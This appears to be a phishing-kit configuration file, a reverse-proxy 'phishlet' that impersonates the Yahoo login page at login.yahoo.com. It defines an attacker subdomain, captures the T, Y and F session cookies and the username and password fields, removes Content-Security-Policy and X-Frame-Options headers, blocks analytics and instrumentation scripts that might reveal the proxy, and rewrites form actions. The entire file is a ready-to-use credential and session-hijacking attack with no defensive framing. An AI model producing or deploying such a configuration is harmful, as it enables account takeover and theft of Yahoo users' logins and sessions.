name: "Yahoo-Login"
author: "Vanta v5"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "yahoo"
    target: "login.yahoo.com"
auth_urls: ["/"]
landing_path: ["/"]
auth_tokens:
  - {type: "cookie", name: "T"}
  - {type: "cookie", name: "Y"}
  - {type: "cookie", name: "F"}
credentials:
  - {type: "post_param", name: "username", regex: null}
  - {type: "post_param", name: "password", regex: null}
injections: []
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
path_rewrites: []
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|/ga.js|/ywa.js|/instrumentation", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action]", action_to: "/account/challenge/password"}
